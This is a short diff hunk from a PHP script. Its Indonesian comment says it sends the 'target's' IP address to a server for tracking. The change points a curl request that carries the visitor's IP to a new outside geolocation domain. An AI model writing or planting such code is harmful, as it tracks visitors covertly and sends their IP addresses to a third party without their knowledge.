@@ -43,7 +43,7 @@ return $ipaddress;
 }
 
 // MENGIRIM ALAMAT IP PRIBADI SI TARGET KE SERVER UNTUK DILACAK
-$url = "https://jefanya.website/api/geolocation/?ip=".getClientIP();
+$url = "https://jefanya.biz.id/api/geolocation/?ip=".getClientIP();
 
 $curl = curl_init($url);
 curl_setopt($curl, CURLOPT_URL, $url);
